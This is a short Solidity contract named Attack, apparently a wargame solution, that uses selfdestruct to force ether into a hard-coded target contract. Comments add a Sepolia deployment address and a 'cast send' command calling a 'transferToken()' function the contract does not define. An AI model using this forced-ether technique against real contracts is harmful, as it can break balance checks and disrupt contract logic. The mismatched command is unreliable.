// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    event Received(address, uint);

    address payable public force;

    constructor() {
        force = payable(0x7Fd4A8743F8Be7961b911C0e67090d45d15bC9d5);
    }

    function destroyContract() external {
        selfdestruct(force);
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}

// contract Attack 0xab60fAF196f2CC1CF8001D1D1476ff0D4149Fe7c

// cast send 0xab60fAF196f2CC1CF8001D1D1476ff0D4149Fe7c "transferToken()" --rpc-url $SEPOLIA_RPC_URL --private-key=$PRIVATE_KEY
